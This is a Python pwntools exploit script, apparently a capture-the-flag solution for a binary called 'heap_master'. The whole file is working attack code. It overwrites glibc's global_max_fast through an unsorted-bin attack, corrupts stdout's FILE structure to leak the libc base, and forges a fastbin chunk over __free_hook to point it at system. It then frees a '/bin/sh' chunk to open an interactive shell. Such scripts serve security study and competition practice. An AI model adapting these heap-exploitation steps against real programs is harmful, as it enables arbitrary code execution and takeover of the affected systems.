#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
from time import sleep
import os
context.binary = "./heap_master"
libc = ELF(context.binary.libc.path)
libc.sym['global_max_fast'] = 0x3c67f8
libc.sym['main_arena'] = 0x3c4b20
libc.sym['one_gadget'] = 0x45216

def add(size):
    io.sendlineafter(">> ", "1")
    sleep(0.01)
    io.sendlineafter("size: ", str(size))
    sleep(0.01)

def edit(offset, cont):
    io.sendlineafter(">> ", "2")
    sleep(0.01)
    io.sendlineafter("offset: ", str(offset))
    sleep(0.01)
    io.sendlineafter("size: ", str(len(cont)))
    sleep(0.01)
    io.sendafter("content: ", cont)
    sleep(0.01)

def m_edit(offset, cont):
    io.sendline("2")
    sleep(0.01)
    io.sendline(str(offset))
    sleep(0.01)
    io.sendline(str(len(cont)))
    sleep(0.01)
    io.send(cont)
    sleep(0.01)

def delete(offset):
    io.sendlineafter(">> ", "3")
    sleep(0.01)
    io.sendlineafter("offset: ", str(offset))
    sleep(0.01)

def m_delete(offset):
    io.sendline("3")
    sleep(0.01)
    io.sendline(str(offset))
    sleep(0.01)

def DEBUG():
    base = int(os.popen("pmap {}| awk '{{print $1}}'".format(io.pid)).readlines()[2], 16)
    warn("free @ {:#x}".format(base + 0xECB))
    warn("edit @ {:#x}".format(base + 0xE54))
    warn("malloc @ {:#x}".format(base + 0xF00))
    pause()


io = process("./heap_master")
#  print(hex(io.libc.address & 0xffff))

#  context.log_level = "debug"
edit(0, flat(0, 0x91, '0' * 0x80, 0, 0x21, '1' * 0x10, 0, 0x21))
#  edit(0, flat(0, 0x91, '0' * 0x80, 0, 0x21, '1' * 0x10))
delete(0x10)

guess = 0xd000
edit(0x18, p16((guess + libc.sym['global_max_fast'] - 0x10) & 0xffff))
add(0x80)

fastbinsY = guess + libc.sym['main_arena'] + 8
_IO_read_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x10
_IO_write_base = guess + libc.sym['_IO_2_1_stdout_'] + 0x20
_IO_write_ptr = guess + libc.sym['_IO_2_1_stdout_'] + 0x28
_IO_write_end = guess + libc.sym['_IO_2_1_stdout_'] + 0x30
__free_hook = guess + libc.sym['__free_hook']
_IO_list_all = guess + libc.sym['_IO_list_all']

# overwrite _IO_2_1_stdout_._IO_write_base
idx = (_IO_write_base - fastbinsY) / 8
size = idx * 0x10 + 0x20
m_edit(0x10 + 0x8, flat(size + 1))
m_edit(0x10 + size, flat(0, 0x21))
m_delete(0x10 + 0x10)

# overwrite _IO_2_1_stdout_._IO_write_ptr
idx = (_IO_write_ptr - fastbinsY) / 8
size = idx * 0x10 + 0x20
m_edit(0x10 + 0x8 + 0x10, flat(size + 1))
m_edit(0x10 + size + 0x10, flat(0, 0x21))
m_delete(0x10 + 0x10 + 0x10)

# overwrite _IO_2_1_stdout_._IO_write_end
idx = (_IO_write_end - fastbinsY) / 8
size = idx * 0x10 + 0x20
m_edit(0x10 + 0x8 + 0x10, flat(size + 1))
m_edit(0x10 + size + 0x10, flat(0, 0x21))
m_delete(0x10 + 0x10 + 0x10)


# overwrite _IO_2_1_stdout_._IO_read_end
idx = (_IO_read_end - fastbinsY) / 8
size = idx * 0x10 + 0x20
m_edit(0x10 + 0x8, flat(size + 1))
m_edit(0x10 + size, flat(0, 0x21))
#  DEBUG()
m_delete(0x10 + 0x10)


libc.address = u64(io.recvuntil("\x7f")[-6: ] + '\0\0') - libc.sym['main_arena'] - 88
success("libc @ {:#x}".format(libc.address))


# fake fastbin fd to system
idx = (__free_hook - fastbinsY) / 8
size = idx * 0x10 + 0x20
edit(0x10 + 8, flat(size + 1))
edit(0x10 + size, flat(0, 0x21))
delete(0x10 + 0x10)
edit(0x20, flat(libc.sym['system']))

add(size - 0x10)

edit(0x200, flat(0, 0x21, "/bin/sh\0"))
#  DEBUG()
delete(0x200 + 0x10)

io.interactive()
